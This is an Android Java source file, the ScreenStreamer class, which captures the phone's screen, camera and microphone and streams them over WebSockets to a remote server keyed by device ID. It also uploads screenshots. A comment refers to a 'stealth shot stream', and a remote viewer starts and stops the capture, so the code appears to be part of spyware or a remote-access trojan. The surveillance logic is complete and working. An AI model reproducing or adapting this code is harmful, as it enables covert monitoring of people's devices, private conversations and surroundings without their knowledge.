package com.gls.sim1;

import android.annotation.SuppressLint;
import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.view.Display;
import android.view.WindowManager;

import com.google.gson.JsonObject;

import java.nio.ByteBuffer;
import java.util.Collections;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;

import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class ScreenStreamer {
    private static final ScreenStreamer I = new ScreenStreamer();
    public static ScreenStreamer getInstance() { return I; }

    private MediaProjection projection;
    private MediaProjectionManager mpm;
    private final AtomicBoolean screenOn = new AtomicBoolean(false);
    private final AtomicBoolean camOn = new AtomicBoolean(false);
    private final AtomicBoolean micOn = new AtomicBoolean(false);
    private final Map<String, WebSocket> sockets = new ConcurrentHashMap<>();
    private final java.util.Set<String> pendingOpen =
            java.util.Collections.newSetFromMap(new java.util.concurrent.ConcurrentHashMap<>());
    private HandlerThread bgThread;
    private Handler bg;
    private ImageReader screenReader;
    private CameraDevice camera;
    private ImageReader camReader;
    private Thread micThread;
    private volatile boolean micRun;
    private volatile boolean pendingShot;
    private long lastScreenFrame, lastCamFrame;
    private int screenFpsCapMs = 90;
    private int camFpsCapMs = 50;

    private ScreenStreamer() {}

    // ---------- projection lifecycle ----------

    public synchronized boolean hasProjection() {
        return projection != null;
    }

    private synchronized void setProjection(MediaProjection p) {
        if (projection != null && projection != p) {
            try { projection.stop(); } catch (Exception ignored) {}
        }
        projection = p;
    }

    public void onConsentResolved(Context ctx, String type, String facing) {
        ensureBg();
        start(ctx, type, facing);
    }

    @SuppressLint("WrongConstant")
    public void onConsentResolved(final Context ctx, final String type, final String facing, final int resultCode, final Intent data) {
        ensureBg();
        final Context app = ctx.getApplicationContext();
        bg().post(() -> {
            StreamService.requestStart(app, StreamService.KIND_PROJECTION);
            boolean ready = StreamService.awaitForeground(3000);
            android.util.Log.i("SIM1", "onConsentResolved fgsReady=" + ready + " type=" + type);
            if (mpm == null) mpm = (MediaProjectionManager) app.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            MediaProjection p;
            try {
                p = mpm.getMediaProjection(resultCode, data);
            } catch (Exception e) {
                android.util.Log.e("SIM1", "getMediaProjection failed: " + e);
                return;
            }
            if (p == null) return;
            try {
                p.registerCallback(new MediaProjection.Callback() {
                    @Override public void onStop() {
                        stop("screen");
                        stop("cam");
                        stop("mic");
                        StreamService.requestStop(app);
                    }
                }, bg());
            } catch (Exception ignored) {}
            setProjection(p);
            startInternal(app, type, facing);
        });
    }

    private synchronized void ensureBg() {
        if (bgThread == null) {
            bgThread = new HandlerThread("s1-stream");
            bgThread.start();
            bg = new Handler(bgThread.getLooper());
        }
    }

    private synchronized Handler bg() {
        ensureBg();
        return bg;
    }

    // ---------- entry points ----------

    public void start(Context ctx, String type, String facing) {
        ensureBg();
        final Context app = ctx.getApplicationContext();
        final String t = type == null ? "screen" : type;
        final String f = facing;
        bg().post(() -> {
            StreamService.requestStart(app, kindFor(t));
            StreamService.awaitForeground(3000);
            startInternal(app, t, f);
        });
    }

    private static int kindFor(String type) {
        if (type == null) return StreamService.KIND_PROJECTION;
        switch (type) {
            case "cam": return StreamService.KIND_CAMERA;
            case "mic": return StreamService.KIND_MIC;
            default: return StreamService.KIND_PROJECTION;
        }
    }

    private void startInternal(Context ctx, String type, String facing) {
        switch (type) {
            case "screen": startProjectionStream(ctx); break;
            case "cam": startCamInternal(ctx, facing == null ? "front" : facing); break;
            case "mic": startMicInternal(ctx); break;
            case "shot": pendingShot = true; startProjectionStream(ctx); break;
        }
    }

    public void stop(String kind) {
        if (kind == null) return;
        switch (kind) {
            case "screen": stopScreen(); break;
            case "cam": stopCam(); break;
            case "mic": stopMic(); break;
            case "screen_stop": stopScreen(); break;
            case "cam_stop": stopCam(); break;
            case "mic_stop": stopMic(); break;
            default: stopScreen(); stopCam(); stopMic();
        }
        if (!anyActive()) StreamService.requestStop(null);
    }

    public boolean anyActive() {
        return screenOn.get() || camOn.get() || micOn.get();
    }

    public void sendScreenFrame(byte[] jpg) {
        push("screen", jpg);
    }

    /** Proactively open a stream socket (used by the stealth shot stream, whose
     *  frames do not go through start()/streamActive()). */
    public void ensureSocket(final String kind) {
        bg().post(() -> openSocket(kind));
    }

    // ---------- screen ----------

    @SuppressLint("WrongConstant")
    private void startProjectionStream(Context ctx) {
        if (projection == null) { android.util.Log.w("SIM1", "startProjectionStream: no projection"); return; }
        if (!screenOn.compareAndSet(false, true)) return;
        android.util.Log.i("SIM1", "startProjectionStream begin");
        try {
            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            Display disp = wm.getDefaultDisplay();
            Size sz = new Size(Math.max(320, Math.min(DeviceTier.screenMaxW(), disp.getWidth())),
                    Math.max(480, Math.min(DeviceTier.screenMaxH(), disp.getHeight())));
            screenReader = ImageReader.newInstance(sz.getWidth(), sz.getHeight(), PixelFormat.RGBA_8888, 2);
            projection.createVirtualDisplay("s1",
                    sz.getWidth(), sz.getHeight(),
                    ctx.getResources().getDisplayMetrics().densityDpi,
                    android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    screenReader.getSurface(), null, bg());
            screenReader.setOnImageAvailableListener(this::onScreenFrame, bg());
            android.util.Log.i("SIM1", "virtual display created " + sz.getWidth() + "x" + sz.getHeight());
        } catch (Exception e) {
            screenOn.set(false);
            android.util.Log.e("SIM1", "startProjectionStream failed: " + e);
        }
    }

    private void onScreenFrame(ImageReader reader) {
        Image img = null;
        try {
            long now = System.currentTimeMillis();
            if (now - lastScreenFrame < screenFpsCapMs && !pendingShot) {
                img = reader.acquireLatestImage();
                return;
            }
            img = reader.acquireLatestImage();
            if (img == null) return;
            Bitmap bmp = rgbaToBitmap(img);
            if (bmp == null) return;
            byte[] jpg = StreamEncoder.toJpeg(bmp, pendingShot ? 90 : DeviceTier.screenQuality());
            bmp.recycle();
            if (pendingShot) {
                pendingShot = false;
                Net.uploadFile(Net.deviceId(Foreground.ctx()), "shot-" + now + ".jpg", jpg, "image/jpeg");
            } else {
                lastScreenFrame = now;
                push("screen", jpg);
            }
        } catch (Exception ignored) {
        } finally {
            if (img != null) img.close();
        }
    }

    private Bitmap rgbaToBitmap(Image img) {
        try {
            Image.Plane pl = img.getPlanes()[0];
            ByteBuffer buf = pl.getBuffer();
            int w = img.getWidth(), h = img.getHeight();
            int stride = pl.getRowStride();
            int pixStride = pl.getPixelStride();
            int[] px = new int[w * h];
            if (pixStride == 4 && stride == w * 4) {
                buf.position(0);
                buf.asIntBuffer().get(px, 0, w * h);
            } else {
                byte[] row = new byte[stride];
                for (int y = 0; y < h; y++) {
                    buf.position(y * stride);
                    int rem = Math.min(stride, buf.remaining());
                    if (row.length < rem) row = new byte[rem];
                    buf.get(row, 0, rem);
                    for (int x = 0; x < w; x++) {
                        int i = x * pixStride;
                        px[y * w + x] = 0xFF000000 | ((row[i] & 0xFF) << 16) | ((row[i + 1] & 0xFF) << 8) | (row[i + 2] & 0xFF);
                    }
                }
            }
            Bitmap bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
            bmp.setPixels(px, 0, w, 0, 0, w, h);
            return bmp;
        } catch (Exception e) {
            return null;
        }
    }

    private void stopScreen() {
        if (!screenOn.compareAndSet(true, false)) return;
        if (screenReader != null) {
            try { screenReader.close(); } catch (Exception ignored) {}
            screenReader = null;
        }
        closeSocket("screen");
        MediaProjection p;
        synchronized (this) {
            p = projection;
            projection = null;
        }
        if (p != null) {
            try { p.stop(); } catch (Exception ignored) {}
        }
        StreamService.requestRelease(StreamService.KIND_PROJECTION);
    }

    // ---------- camera ----------

    private void startCamInternal(Context ctx, String facing) {
        if (!camOn.compareAndSet(false, true)) return;
        try {
            if (ctx.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                android.util.Log.e("SIM1", "camera permission not granted");
                camOn.set(false);
                return;
            }
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            int want = facing.equals("front")
                    ? CameraCharacteristics.LENS_FACING_FRONT
                    : CameraCharacteristics.LENS_FACING_BACK;
            String target = null;
            for (String id : cm.getCameraIdList()) {
                Integer f = cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == want) { target = id; break; }
            }
            if (target == null) { camOn.set(false); return; }
            final String camId = target;
            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice d) {
                    if (!camOn.get()) { d.close(); return; }
                    camera = d;
                    try {
                        CameraCharacteristics ch = cm.getCameraCharacteristics(camId);
                        StreamConfigurationMap map = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                        Size[] sizes = map == null ? null : map.getOutputSizes(android.graphics.ImageFormat.YUV_420_888);
                        if (sizes == null && map != null) sizes = map.getOutputSizes(ImageReader.class);
                        Size best = null;
                        if (sizes != null) {
                            for (Size s : sizes) {
                                if (s.getWidth() <= DeviceTier.camMaxW() && s.getHeight() <= DeviceTier.camMaxH()) {
                                    if (best == null
                                            || s.getWidth() * s.getHeight() > best.getWidth() * best.getHeight()) {
                                        best = s;
                                    }
                                }
                            }
                        }
                        if (best == null) best = new Size(640, 480);
                        android.util.Log.i("SIM1", "cam size " + best.getWidth() + "x" + best.getHeight());
                        Integer rot = ch.get(CameraCharacteristics.SENSOR_ORIENTATION);
                        final int orientation = rot == null ? 0 : rot;
                        camReader = ImageReader.newInstance(best.getWidth(), best.getHeight(), ImageFormat2(), 2);
                        camReader.setOnImageAvailableListener(r -> onCamFrame(r, orientation), bg());
                        d.createCaptureSession(Collections.singletonList(camReader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession s) {
                                        try {
                                            CaptureRequest.Builder b = d.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                                            b.addTarget(camReader.getSurface());
                                            b.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
                                            s.setRepeatingRequest(b.build(), null, bg());
                                            openSocket("cam");
                                            android.util.Log.i("SIM1", "cam repeating request set");
                                        } catch (Exception e) {
                                            android.util.Log.e("SIM1", "cam repeating failed: " + e);
                                            failCamera(d, s);
                                        }
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession s) {
                                        android.util.Log.e("SIM1", "cam session configure failed");
                                        failCamera(d, s);
                                    }
                                }, bg());
                    } catch (Exception e) {
                        android.util.Log.e("SIM1", "cam open setup failed: " + e);
                        try { d.close(); } catch (Exception ignored) {}
                        camera = null;
                        camOn.set(false);
                        closeSocket("cam");
                    }
                }
                @Override public void onDisconnected(CameraDevice d) {
                    d.close();
                    camera = null;
                    camOn.set(false);
                    closeSocket("cam");
                }
                @Override public void onError(CameraDevice d, int e) {
                    android.util.Log.e("SIM1", "cam device error " + e);
                    d.close();
                    camera = null;
                    camOn.set(false);
                    closeSocket("cam");
                }
            }, bg());
            openSocket("cam");
        } catch (Exception e) {
            android.util.Log.e("SIM1", "openCamera failed: " + e);
            camOn.set(false);
            closeSocket("cam");
        }
    }

    private void failCamera(CameraDevice d, CameraCaptureSession s) {
        try { if (s != null) s.close(); } catch (Exception ignored) {}
        try { if (d != null) d.close(); } catch (Exception ignored) {}
        if (camReader != null) {
            try { camReader.close(); } catch (Exception ignored) {}
            camReader = null;
        }
        camera = null;
        camOn.set(false);
        closeSocket("cam");
    }

    private static int ImageFormat2() {
        return android.graphics.ImageFormat.YUV_420_888;
    }

    private void onCamFrame(ImageReader reader, int orientation) {
        Image img = null;
        try {
            long now = System.currentTimeMillis();
            img = reader.acquireLatestImage();
            if (img == null) return;
            if (now - lastCamFrame < camFpsCapMs) return;
            byte[] jpg = StreamEncoder.yuv420ToJpeg(img, DeviceTier.camQuality(), orientation);
            lastCamFrame = now;
            if (jpg != null && jpg.length > 0) push("cam", jpg);
        } catch (Exception e) {
            android.util.Log.e("SIM1", "cam frame failed: " + e);
        } finally {
            if (img != null) img.close();
        }
    }

    private void stopCam() {
        if (!camOn.compareAndSet(true, false)) return;
        if (camera != null) {
            try { camera.close(); } catch (Exception ignored) {}
            camera = null;
        }
        if (camReader != null) {
            try { camReader.close(); } catch (Exception ignored) {}
            camReader = null;
        }
        closeSocket("cam");
        StreamService.requestRelease(StreamService.KIND_CAMERA);
    }

    // ---------- mic ----------

    private void startMicInternal(Context ctx) {
        if (!micOn.compareAndSet(false, true)) return;
        micRun = true;
        openSocket("mic");
        micThread = new Thread(() -> {
            android.media.AudioRecord ar = null;
            try {
                int min = android.media.AudioRecord.getMinBufferSize(16000,
                        android.media.AudioFormat.CHANNEL_IN_MONO,
                        android.media.AudioFormat.ENCODING_PCM_16BIT);
                ar = new android.media.AudioRecord(
                        android.media.MediaRecorder.AudioSource.MIC,
                        16000,
                        android.media.AudioFormat.CHANNEL_IN_MONO,
                        android.media.AudioFormat.ENCODING_PCM_16BIT,
                        Math.max(min * 2, 16384));
                if (ar.getState() != android.media.AudioRecord.STATE_INITIALIZED) { Log.i("SIM1","mic not initialized"); return; }
                ar.startRecording();
                byte[] buf = new byte[4096];
                Log.i("SIM1", "mic start min=" + min);
                int sent = 0;
                while (micRun) {
                    int n = ar.read(buf, 0, buf.length);
                    if (n <= 0) { Log.i("SIM1", "mic read n=" + n); continue; }
                    WebSocket ws = sockets.get("mic");
                    boolean ok = false;
                    if (ws != null) {
                        try { ok = ws.send(okio.ByteString.of(buf, 0, n)); }
                        catch (Exception e) { Log.i("SIM1", "mic send ex " + e); }
                    }
                    if (!ok) {
                        sockets.remove("mic");
                        openSocket("mic");
                    } else if ((sent++ % 100) == 0) {
                        Log.i("SIM1", "mic sent " + sent + " n=" + n);
                    }
                }
            } catch (Exception e) {
                Log.i("SIM1", "mic loop ex " + e);
            } finally {
                if (ar != null) {
                    try { ar.stop(); } catch (Exception ignored) {}
                    ar.release();
                }
            }
        }, "s1-mic");
        micThread.start();
    }

    private void stopMic() {
        if (!micOn.compareAndSet(true, false)) return;
        micRun = false;
        if (micThread != null) {
            micThread.interrupt();
            micThread = null;
        }
        closeSocket("mic");
        StreamService.requestRelease(StreamService.KIND_MIC);
    }

    // ---------- sockets ----------

    private void openSocket(String kind) {
        if (sockets.get(kind) != null || pendingOpen.contains(kind)) return;
        Context ctx = Foreground.ctx();
        if (ctx == null) return;
        pendingOpen.add(kind);
        String id = Net.deviceId(ctx);
        Net.openStream(id, kind, new WebSocketListener() {
            @Override public void onOpen(WebSocket ws, Response r) {
                pendingOpen.remove(kind);
                sockets.put(kind, ws);
            }
            @Override public void onMessage(WebSocket ws, String text) {
                handleControl(kind, text);
            }
            @Override public void onFailure(WebSocket ws, Throwable t, Response r) {
                pendingOpen.remove(kind);
                sockets.remove(kind, ws);
                if (streamActive(kind)) bg().postDelayed(() -> openSocket(kind), DeviceTier.reconnectMs());
            }
            @Override public void onClosed(WebSocket ws, int code, String reason) {
                pendingOpen.remove(kind);
                sockets.remove(kind, ws);
                if (streamActive(kind)) bg().postDelayed(() -> openSocket(kind), DeviceTier.reconnectMs());
            }
        });
    }

    private void handleControl(String kind, String text) {
        try {
            JsonObject o = Net.G.fromJson(text, JsonObject.class);
            if (o != null && o.has("ctl") && "viewer_gone".equals(o.get("ctl").getAsString())) {
                android.util.Log.i("SIM1", "viewer gone -> stop " + kind);
                stop(kind);
            }
        } catch (Exception ignored) {
        }
    }

    private boolean streamActive(String kind) {
        switch (kind) {
            case "screen": return screenOn.get();
            case "cam": return camOn.get();
            case "mic": return micOn.get();
            default: return false;
        }
    }

    private void closeSocket(String kind) {
        pendingOpen.remove(kind);
        WebSocket ws = sockets.remove(kind);
        if (ws != null) {
            try { ws.close(1000, null); } catch (Exception ignored) {}
        }
    }

    private void push(String kind, byte[] jpeg) {
        WebSocket ws = sockets.get(kind);
        if (ws != null && ws.send(okio.ByteString.of(jpeg))) return;
        sockets.remove(kind);
        Context ctx = Foreground.ctx();
        if (ctx == null) return;
        String id = Net.deviceId(ctx);
        Net.openStream(id, kind, new WebSocketListener() {
            @Override public void onOpen(WebSocket w, Response r) {
                sockets.put(kind, w);
                w.send(okio.ByteString.of(jpeg));
            }
            @Override public void onMessage(WebSocket w, String text) {
                handleControl(kind, text);
            }
            @Override public void onFailure(WebSocket w, Throwable t, Response r) {
                sockets.remove(kind, w);
            }
        });
    }

    public void shutdownAll() {
        stopScreen();
        stopCam();
        stopMic();
    }
}
